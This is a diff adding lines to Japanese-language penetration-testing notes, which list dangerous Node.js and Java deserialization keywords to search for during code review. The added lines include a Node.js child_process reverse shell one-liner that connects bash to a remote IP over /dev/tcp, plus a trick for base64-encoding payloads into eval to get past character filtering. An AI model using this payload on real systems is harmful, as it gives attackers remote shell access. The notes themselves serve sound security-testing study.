@@ -69,6 +69,10 @@ Injection系はevalを探す。
 
 ### Node.js
 `eval`,`eval(`,`html`,`escape`,`new Buffer(`,`unserialize`,`node-serialize`,`deserialize`,`new Function`   
+  
+`require("child_process").exec('bash -c "bash -i >%26 /dev/tcp/192.168.56.2/80 0>%261"')`でRever shell  
+記号が欠落してうまく行かないときは以下のようにbase64して送信する。  
+`eval(new Buffer.from("Y29uc29sZS5sb2coJ3Rlc3QnKTs=","base64").toString());`  
 ### Java Deserialization
 Cookie,パラメータの値,VIEWの値などを確認。RMI,JMX。  
 `readObject`,`readExternal`,`readUnshared`,`XStream`,`AC ED`で始まるバイトストリーム,`%C2%AC%C3%AD%00%05`のURLエンコード,`rO0AB`のBase64エンコード(Serializeされたことを示すマジックナンバー)、`ObjectInputStream`,`ObjectOutputStream`,`defaultReadObject`,`org.apache.commons.collections`   
